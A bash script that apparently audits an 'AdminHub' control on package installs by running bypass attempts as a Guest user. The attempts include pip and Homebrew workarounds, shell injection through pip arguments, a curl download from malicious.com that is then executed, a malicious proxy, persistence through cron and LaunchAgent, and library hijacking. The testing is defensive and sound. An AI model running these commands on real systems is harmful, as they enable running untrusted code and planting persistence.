#!/bin/bash
# AdminHub Security Audit Tool
# Comprehensive testing of security controls and bypass prevention

echo "🔥 AdminHub Advanced Security Penetration Test"
echo "=============================================="
echo "Testing ALL possible bypass vectors..."
echo ""

FAILED_TESTS=0
PASSED_TESTS=0
CRITICAL_FAILS=0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

test_bypass() {
    local category="$1"
    local test_name="$2"
    local command="$3"
    local severity="$4"  # LOW, MEDIUM, HIGH, CRITICAL
    
    echo -e "${BLUE}🔍 [$category] Testing: $test_name${NC}"
    echo "   Command: $command"
    echo "   Severity: $severity"
    
    local start_time=$(date +%s.%N)
    
    if output=$(bash -c "$command" 2>&1); then
        local end_time=$(date +%s.%N)
        local duration=$(echo "$end_time - $start_time" | bc -l 2>/dev/null || echo "unknown")
        
        echo -e "   ${RED}❌ SECURITY FAIL: Bypass was successful! (${duration}s)${NC}"
        echo "   Output: $output"
        
        FAILED_TESTS=$((FAILED_TESTS + 1))
        if [[ "$severity" == "CRITICAL" ]]; then
            CRITICAL_FAILS=$((CRITICAL_FAILS + 1))
        fi
    else
        local exit_code=$?
        if [[ "$output" == *"Error:"* ]] && [[ "$output" == *"not allowed"* ]]; then
            echo -e "   ${GREEN}✅ SECURITY OK: Bypass properly blocked${NC}"
            PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [[ "$exit_code" -eq 130 ]]; then
            echo -e "   ${YELLOW}⚠️  INTERRUPTED: Command was interrupted${NC}"
        else
            echo -e "   ${YELLOW}⚠️  UNCLEAR: Unexpected result (exit: $exit_code)${NC}"
            echo "   Output: $output"
        fi
    fi
    echo ""
}

echo "🐍 PYTHON ATTACK VECTORS"
echo "========================"

# Python direct execution bypasses
test_bypass "PYTHON" "Direct python binary access" \
           "USER=Guest /opt/homebrew/bin/python3 -c \"import subprocess; subprocess.run(['pip', 'install', '--target', '/tmp/attack1', 'requests'])\"" \
           "CRITICAL"

test_bypass "PYTHON" "Python -c pip import bypass" \
           "USER=Guest /opt/admin-tools/bin/python -c \"import pip; pip.main(['install', '--isolated', '--target', '/tmp/attack2', 'requests'])\"" \
           "CRITICAL"

test_bypass "PYTHON" "Python -m ensurepip bypass" \
           "USER=Guest /opt/admin-tools/bin/python -m ensurepip --default-pip --target /tmp/attack3" \
           "HIGH"

test_bypass "PYTHON" "PYTHONPATH manipulation" \
           "USER=Guest PYTHONPATH=/tmp/malicious /opt/admin-tools/bin/python -c \"import sys; print(sys.path)\"" \
           "MEDIUM"

test_bypass "PYTHON" "Python site-packages direct write" \
           "USER=Guest /opt/admin-tools/bin/python -c \"import site; print(site.getsitepackages()); open('/opt/homebrew/lib/python3.13/site-packages/malicious.py', 'w').write('print(\\\"hacked\\\")')\"" \
           "CRITICAL"

test_bypass "PYTHON" "Virtual environment bypass" \
           "USER=Guest /opt/admin-tools/bin/python -m venv /tmp/venv && /tmp/venv/bin/pip install --target /usr/local/lib/python3.13/site-packages requests" \
           "HIGH"

test_bypass "PYTHON" "Python executable replacement" \
           "USER=Guest cp /bin/cat /tmp/python && USER=Guest /tmp/python -m pip install --target /tmp/attack4 requests" \
           "MEDIUM"

echo "📦 PIP ADVANCED BYPASS VECTORS"
echo "==============================="

# Advanced pip bypasses
test_bypass "PIP" "Pip config directory manipulation" \
           "USER=Guest mkdir -p /tmp/.config/pip && echo '[global]\nbreak-system-packages = true\ntarget = /tmp/attack5' > /tmp/.config/pip/pip.conf && USER=Guest XDG_CONFIG_HOME=/tmp pip install requests" \
           "HIGH"

test_bypass "PIP" "Pip cache manipulation" \
           "USER=Guest pip install --cache-dir /tmp/cache --target /tmp/attack6 --isolated requests" \
           "MEDIUM"

test_bypass "PIP" "Pip build directory bypass" \
           "USER=Guest pip install --build /tmp/build --target /tmp/attack7 requests" \
           "MEDIUM"

test_bypass "PIP" "Pip environment variables bypass" \
           "USER=Guest PIP_TARGET=/tmp/attack8 PIP_ISOLATED=1 pip install requests" \
           "HIGH"

test_bypass "PIP" "Pip wheel bypass" \
           "USER=Guest pip wheel --wheel-dir /tmp/wheels requests && pip install --find-links /tmp/wheels --target /tmp/attack9 requests" \
           "MEDIUM"

echo "🍺 HOMEBREW ATTACK VECTORS"
echo "=========================="

# Homebrew bypasses
test_bypass "HOMEBREW" "Direct brew binary access" \
           "USER=Guest /opt/homebrew/bin/brew install --force nodejs" \
           "CRITICAL"

test_bypass "HOMEBREW" "Homebrew prefix manipulation" \
           "USER=Guest HOMEBREW_PREFIX=/tmp/brew /opt/homebrew/bin/brew install nodejs" \
           "HIGH"

test_bypass "HOMEBREW" "Homebrew tap bypass" \
           "USER=Guest /opt/admin-tools/bin/brew tap malicious/repo https://github.com/malicious/homebrew-repo.git" \
           "HIGH"

test_bypass "HOMEBREW" "Homebrew formula creation" \
           "USER=Guest /opt/admin-tools/bin/brew create --formula https://malicious.com/package.tar.gz" \
           "CRITICAL"

test_bypass "HOMEBREW" "Homebrew environment bypass" \
           "USER=Guest HOMEBREW_TEMP=/tmp HOMEBREW_CACHE=/tmp brew install nodejs" \
           "MEDIUM"

echo "🔧 GIT ATTACK VECTORS"
echo "==================="

# Git bypasses
test_bypass "GIT" "Direct git binary access" \
           "USER=Guest /opt/homebrew/bin/git clone https://github.com/malicious/repo.git /tmp/malicious_repo" \
           "MEDIUM"

test_bypass "GIT" "Git config manipulation" \
           "USER=Guest /opt/admin-tools/bin/git config --global core.editor 'rm -rf /tmp/test'" \
           "HIGH"

test_bypass "GIT" "Git hooks execution" \
           "USER=Guest mkdir -p /tmp/repo/.git/hooks && echo '#!/bin/bash\ntouch /tmp/pwned' > /tmp/repo/.git/hooks/post-commit && chmod +x /tmp/repo/.git/hooks/post-commit" \
           "HIGH"

test_bypass "GIT" "Git credential access" \
           "USER=Guest /opt/admin-tools/bin/git config --get-regexp credential" \
           "MEDIUM"

echo "💻 SYSTEM COMMAND INJECTION"
echo "==========================="

# System command injection
test_bypass "SYSTEM" "Shell injection via pip args" \
           "USER=Guest /opt/admin-tools/bin/pip install 'requests; touch /tmp/injected'" \
           "CRITICAL"

test_bypass "SYSTEM" "Environment variable injection" \
           "USER=Guest SHELL=/bin/bash pip install requests" \
           "MEDIUM"

test_bypass "SYSTEM" "PATH manipulation" \
           "USER=Guest PATH=/tmp:/bin:/usr/bin pip install requests" \
           "HIGH"

test_bypass "SYSTEM" "File descriptor manipulation" \
           "USER=Guest /opt/admin-tools/bin/pip install requests 3>/tmp/fd_test" \
           "LOW"

test_bypass "SYSTEM" "Process substitution" \
           "USER=Guest /opt/admin-tools/bin/pip install <(echo 'malicious_package')" \
           "HIGH"

echo "🌐 NETWORK ATTACK VECTORS" 
echo "========================="

# Network attacks
test_bypass "NETWORK" "Direct download bypass" \
           "USER=Guest curl -o /tmp/malicious.py https://malicious.com/package.py && python /tmp/malicious.py" \
           "HIGH"

test_bypass "NETWORK" "Proxy manipulation" \
           "USER=Guest HTTP_PROXY=http://malicious-proxy:8080 pip install requests" \
           "MEDIUM"

test_bypass "NETWORK" "DNS manipulation" \
           "USER=Guest dig +short pypi.org" \
           "LOW"

echo "📁 FILE SYSTEM ATTACKS"
echo "======================"

# File system attacks  
test_bypass "FILESYSTEM" "Directory traversal" \
           "USER=Guest pip install --target '../../../tmp/traversal' requests" \
           "HIGH"

test_bypass "FILESYSTEM" "Symlink manipulation" \
           "USER=Guest ln -s /usr/local/lib/python3.13/site-packages /tmp/symlink && pip install --target /tmp/symlink requests" \
           "CRITICAL"

test_bypass "FILESYSTEM" "Temp directory abuse" \
           "USER=Guest TMPDIR=/usr/local/temp pip install requests" \
           "MEDIUM"

test_bypass "FILESYSTEM" "Log file manipulation" \
           "USER=Guest pip install requests 2>&1 | tee /tmp/sensitive_log" \
           "LOW"

echo "🔄 PERSISTENCE MECHANISMS"
echo "========================="

# Persistence attacks
test_bypass "PERSISTENCE" "Shell profile manipulation" \
           "USER=Guest echo 'export PATH=/tmp:$PATH' >> ~/.bashrc" \
           "HIGH"

test_bypass "PERSISTENCE" "Cron job creation" \
           "USER=Guest (crontab -l 2>/dev/null; echo '* * * * * /tmp/malicious.sh') | crontab -" \
           "CRITICAL"

test_bypass "PERSISTENCE" "LaunchAgent creation" \
           "USER=Guest mkdir -p ~/Library/LaunchAgents && echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>' > ~/Library/LaunchAgents/malicious.plist" \
           "CRITICAL"

echo "⚡ ADVANCED BYPASS TECHNIQUES"
echo "============================"

# Advanced techniques
test_bypass "ADVANCED" "Binary name spoofing" \
           "USER=Guest cp /opt/admin-tools/bin/pip /tmp/pip && chmod +x /tmp/pip && /tmp/pip install --target /tmp/spoof requests" \
           "MEDIUM"

test_bypass "ADVANCED" "Library hijacking" \
           "USER=Guest mkdir -p ~/.local/lib/python3.13/site-packages && echo 'import os; os.system(\"touch /tmp/hijacked\")' > ~/.local/lib/python3.13/site-packages/pip.py" \
           "CRITICAL"

test_bypass "ADVANCED" "Memory/proc manipulation" \
           "USER=Guest echo 'malicious_content' > /proc/self/mem 2>/dev/null || echo 'proc access blocked'" \
           "LOW"

echo "📊 SECURITY TEST RESULTS"
echo "========================"
echo "Total tests run: $((PASSED_TESTS + FAILED_TESTS))"
echo "✅ Secured: $PASSED_TESTS"
echo "❌ Vulnerable: $FAILED_TESTS"
echo "🔥 Critical failures: $CRITICAL_FAILS"
echo ""

if [[ $CRITICAL_FAILS -gt 0 ]]; then
    echo -e "${RED}🚨 CRITICAL SECURITY ISSUES FOUND!${NC}"
    echo "Immediate action required for critical vulnerabilities."
    exit 2
elif [[ $FAILED_TESTS -gt 0 ]]; then
    echo -e "${YELLOW}⚠️  Security issues found - review needed${NC}"
    exit 1
else
    echo -e "${GREEN}🎉 All security tests passed!${NC}"
    exit 0
fi
